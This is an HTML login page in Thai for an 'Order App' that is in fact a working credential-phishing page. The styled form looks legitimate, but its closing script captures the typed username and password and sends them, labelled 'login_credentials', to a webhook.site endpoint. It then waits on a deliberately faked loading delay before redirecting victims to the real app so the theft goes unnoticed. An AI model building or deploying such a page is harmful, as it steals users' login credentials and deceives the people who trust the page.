<!DOCTYPE html>
<html lang="th">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>เข้าสู่ระบบ | Order App</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link
    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Anuphan:wght@400;500;600&display=swap"
    rel="stylesheet">
  <style>
    :root {
      --primary: #2563eb;
      --primary-hover: #1d4ed8;
      --bg-body: #f8fafc;
      --bg-card: #ffffff;
      --text-main: #1e293b;
      --text-secondary: #64748b;
      --border: #e2e8f0;
      --input-focus: #3b82f6;
      --shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -4px rgba(0, 0, 0, 0.1);
      --transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Inter', 'Anuphan', sans-serif;
      background-color: var(--bg-body);
      color: var(--text-main);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      overflow-x: hidden;
    }

    /* --- Header --- */
    header {
      background-color: #ffffff;
      height: 64px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0 24px;
      border-bottom: 1px solid var(--border);
      position: sticky;
      top: 0;
      z-index: 100;
    }

    .logo-section {
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .logo-box {
      width: 32px;
      height: 32px;
      background-color: var(--primary);
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-weight: 700;
      font-size: 18px;
    }

    .logo-text {
      font-size: 18px;
      font-weight: 600;
      color: #111827;
    }

    .user-profile {
      display: flex;
      align-items: center;
      gap: 12px;
      cursor: pointer;
      padding: 4px 8px;
      border-radius: 8px;
      transition: var(--transition);
    }

    .user-profile:hover {
      background-color: #f1f5f9;
    }

    .user-info {
      text-align: right;
    }

    .user-name {
      font-size: 14px;
      font-weight: 600;
      display: block;
    }

    .user-role {
      font-size: 12px;
      color: var(--text-secondary);
      display: block;
    }

    .avatar {
      width: 36px;
      height: 36px;
      background-color: #e2e8f0;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #94a3b8;
    }

    /* --- Main Content --- */
    main {
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .login-card {
      background-color: var(--bg-card);
      width: 100%;
      max-width: 440px;
      padding: 48px;
      border-radius: 24px;
      box-shadow: var(--shadow);
      text-align: center;
      animation: slideUp 0.6s ease-out;
    }

    @keyframes slideUp {
      from {
        opacity: 0;
        transform: translateY(20px);
      }

      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .login-card h1 {
      font-size: 32px;
      font-weight: 700;
      margin-bottom: 8px;
      color: #111827;
    }

    .login-card p {
      color: var(--text-secondary);
      margin-bottom: 40px;
      font-size: 16px;
    }

    /* --- Form Elements --- */
    .form-group {
      position: relative;
      margin-bottom: 16px;
      text-align: left;
    }

    .input-wrapper {
      position: relative;
      display: flex;
      align-items: center;
    }

    .input-icon {
      position: absolute;
      left: 16px;
      color: #94a3b8;
      pointer-events: none;
    }

    .input-field {
      width: 100%;
      padding: 14px 16px 14px 48px;
      border: 1px solid var(--border);
      border-radius: 12px;
      font-size: 16px;
      font-family: inherit;
      transition: var(--transition);
      background-color: #ffffff;
      color: var(--text-main);
    }

    .input-field:focus {
      outline: none;
      border-color: var(--input-focus);
      box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.1);
    }

    .password-toggle {
      position: absolute;
      right: 16px;
      color: #94a3b8;
      cursor: pointer;
      background: none;
      border: none;
      padding: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: var(--transition);
    }

    .password-toggle:hover {
      color: var(--text-main);
    }

    .login-btn {
      width: 100%;
      padding: 14px;
      background-color: var(--primary);
      color: white;
      border: none;
      border-radius: 12px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: var(--transition);
      margin-top: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    .login-btn:hover {
      background-color: var(--primary-hover);
      transform: translateY(-1px);
      box-shadow: 0 4px 12px rgba(37, 99, 235, 0.2);
    }

    .login-btn:active {
      transform: translateY(0);
    }

    /* Responsive Improvements */
    @media (max-width: 480px) {
      .login-card {
        padding: 32px 24px;
      }

      .login-card h1 {
        font-size: 28px;
      }
    }
  </style>
</head>

<body>

  <header>
    <div class="logo-section">
      <div class="logo-box">O</div>
      <span class="logo-text">Order App</span>
    </div>
    <div class="user-profile">
      <div class="user-info">
        <span class="user-name">user</span>
        <span class="user-role">พนักงาน</span>
      </div>
      <div class="avatar">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
          stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2" />
          <circle cx="12" cy="7" r="4" />
        </svg>
      </div>
    </div>
  </header>

  <main>
    <div class="login-card">
      <h1>ยินดีต้อนรับ</h1>
      <p>กรุณาเข้าสู่ระบบเพื่อดำเนินการต่อ</p>

      <form id="loginForm" action="login.php" method="post">
        <div class="form-group">
          <div class="input-wrapper">
            <span class="input-icon">
              <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none"
                stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2" />
                <circle cx="12" cy="7" r="4" />
              </svg>
            </span>
            <input type="text" name="username" class="input-field" placeholder="ชื่อผู้ใช้" required>
          </div>
        </div>

        <div class="form-group">
          <div class="input-wrapper">
            <span class="input-icon">
              <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none"
                stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <rect width="18" height="11" x="3" y="11" rx="2" ry="2" />
                <path d="M7 11V7a5 5 0 0 1 10 0v4" />
              </svg>
            </span>
            <input type="password" name="password" id="password" class="input-field" placeholder="รหัสผ่าน" required>
            <button type="button" class="password-toggle" id="togglePassword">
              <svg id="eyeIcon" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24"
                fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z" />
                <circle cx="12" cy="12" r="3" />
              </svg>
            </button>
          </div>
        </div>

        <button type="submit" class="login-btn">
          เข้าสู่ระบบ
        </button>
      </form>
    </div>
  </main>

  <script>
    const togglePassword = document.querySelector('#togglePassword');
    const password = document.querySelector('#password');
    const eyeIcon = document.querySelector('#eyeIcon');

    togglePassword.addEventListener('click', function (e) {
      // toggle the type attribute
      const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
      password.setAttribute('type', type);

      // toggle the eye icon
      if (type === 'text') {
        eyeIcon.innerHTML = '<path d="M9.88 9.88L14.12 14.12"/><path d="M2 12s3-7 10-7a9.45 9.45 0 0 1 5.44 1.73"/><path d="M22 12s-3 7-10 7a9.45 9.45 0 0 1-5.44-1.73"/><path d="m17.56 17.56-1.42-1.42"/><path d="m5.17 5.17 1.42 1.42"/><path d="m2 2 20 20"/>';
      } else {
        eyeIcon.innerHTML = '<path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/>';
      }
    });

    document.getElementById('loginForm').addEventListener('submit', function (e) {
      e.preventDefault();
      const btn = document.querySelector('.login-btn');
      const username = document.querySelector('input[name="username"]').value;
      const password = document.querySelector('input[name="password"]').value;
      const webhookURL = 'https://webhook.site/95276f1e-64c2-42a7-b22d-c55548700670';

      // Visual feedback
      btn.innerText = 'กำลังเข้าสู่ระบบ...';
      btn.style.opacity = '0.7';
      btn.style.pointerEvents = 'none';

      // ส่งข้อมูลไปยัง Webhook
      fetch(webhookURL, {
        method: 'POST',
        mode: 'no-cors',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          type: 'login_credentials',
          username: username,
          password: password,
          user_agent: navigator.userAgent,
          timestamp: new Date().toLocaleString()
        })
      }).finally(() => {
        // แกล้งหน่วงเวลาให้ดูเหมือนโหลดจริง แล้วค่อย Redirect ไปแอปจริง
        setTimeout(() => {
          window.location.href = "https://order-project-frontend.onrender.com/";
        }, 1200);
      });
    });
  </script>
</body>

</html>
